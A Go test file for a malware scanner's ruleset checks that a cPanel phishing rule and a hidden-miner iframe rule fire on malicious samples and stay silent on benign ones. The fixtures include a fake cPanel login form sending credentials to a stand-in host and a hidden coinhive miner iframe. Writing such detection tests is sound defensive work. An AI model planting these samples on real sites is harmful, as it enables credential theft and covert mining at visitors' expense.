package signatures

import (
	"os"
	"path/filepath"
	"testing"
)

// scanRepoRulesAs scans sample under the repository ruleset with the given
// file extension, so rules scoped to .html pages are exercised as pages.
func scanRepoRulesAs(t *testing.T, ext string, sample []byte) map[string]Match {
	t.Helper()
	rules, err := os.ReadFile(filepath.Join("..", "..", "configs", "malware.yml"))
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "malware.yml"), rules, 0o644); err != nil {
		t.Fatal(err)
	}
	s := NewScanner(dir)
	if err := s.LoadError(); err != nil {
		t.Fatalf("loading repository rules: %v", err)
	}
	target := filepath.Join(t.TempDir(), "sample"+ext)
	if err := os.WriteFile(target, sample, 0o644); err != nil {
		t.Fatal(err)
	}
	hit := map[string]Match{}
	for _, m := range s.ScanFile(target, 1<<20) {
		hit[m.RuleName] = m
	}
	return hit
}

// The realtime rule counted "cpanel" and "cPanel Login" as two hits although
// one is a substring of the other, so a hosting provider's own login page with
// a relative form action scored Critical while the YARA twin (brand AND
// password AND absolute action) stayed silent.
func TestPhishingCPanelLoginRequiresCredentialFormAndOffsiteAction(t *testing.T) {
	benign := []byte(`<html><body>
<h1>cPanel Login</h1>
<form method="post" action="/clientarea/cpanel-sso.php">
  <input type="text" name="user">
  <input type="password" name="pass">
  <button>Log in</button>
</form>
</body></html>`)
	if _, hit := scanRepoRulesAs(t, ".html", benign)["phishing_cpanel_login"]; hit {
		t.Fatal("hosting provider cPanel login page with a relative action flagged as phishing")
	}

	kit := []byte(`<html><body>
<h1>cPanel Login</h1>
<form method="post" action="https://collect.example/cp/post.php">
  <input type="text" name="user">
  <input type="password" name="pass">
</form>
</body></html>`)
	if _, hit := scanRepoRulesAs(t, ".html", kit)["phishing_cpanel_login"]; !hit {
		t.Fatal("cPanel phishing kit posting credentials off-site not detected")
	}
}

// The YARA twin was hardened against WordPress oEmbed attributes and bare
// "coin"/"mine" substrings; the realtime rule still fired on a price widget.
func TestMinerHiddenIframeIgnoresOEmbedWidgets(t *testing.T) {
	widget := []byte(`<p>Prices</p>
<iframe marginwidth="0" marginheight="0" frameborder="0" scrolling="no"
        src="https://widgets.coingecko.com/coingecko-coin-price-chart-widget.html"></iframe>`)
	if _, hit := scanRepoRulesAs(t, ".html", widget)["miner_hidden_iframe"]; hit {
		t.Fatal("price widget embed flagged as a hidden miner iframe")
	}

	miner := []byte(`<iframe width="0" height="0" style="display:none" src="https://coinhive.com/lib/loader.html"></iframe>`)
	if _, hit := scanRepoRulesAs(t, ".html", miner)["miner_hidden_iframe"]; !hit {
		t.Fatal("hidden coinhive iframe not detected")
	}
}
